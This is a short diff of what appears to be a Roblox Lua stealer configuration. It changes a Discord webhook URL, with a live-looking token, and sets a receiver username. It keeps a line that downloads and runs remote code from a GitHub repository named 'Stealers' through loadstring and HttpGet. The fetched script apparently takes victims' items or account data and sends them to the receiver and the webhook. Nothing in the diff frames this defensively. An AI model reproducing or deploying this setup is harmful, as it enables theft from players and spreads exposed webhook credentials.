@@ -1,4 +1,4 @@
 Receiver = "robloxian000000"
-Webhook = "https://discord.com/api/webhooks/1303514921295810630/2rE9hItY260Aa1BP4ZelDJ93ktuz4dfnMMIEwoNRIh736pvW94P1hlPmjoY3WPnRc67n"
+Webhook = "https://discord.com/api/webhooks/1304974723934978078/H3P1OFdOYXsdM_FEe560A7AUisQ5wrm1XYh5b3bSnEZ6D4Dthf7Aq8DPXZwj3POvXkd6"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Ezjq/Stealers/main/losg.lua"))()
